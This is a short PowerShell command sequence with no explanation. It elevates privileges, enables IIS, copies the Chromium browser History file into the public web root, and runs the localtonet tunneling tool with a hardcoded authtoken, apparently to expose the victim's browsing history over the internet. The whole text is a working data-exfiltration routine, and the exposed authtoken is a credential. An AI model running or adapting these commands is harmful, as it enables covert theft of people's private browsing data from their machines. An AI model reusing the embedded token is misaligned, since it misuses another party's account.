start-process PowerShell -verb runas 
DISM /online /enable-feature /featureName:IIS-DefaultDocument /All 
 Copy-Item 'AppData\Local\Chromium\User Data\Default\History' 'C:\inetpub\wwwroot\History File ' 
cd Downloads
./localtonet authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI 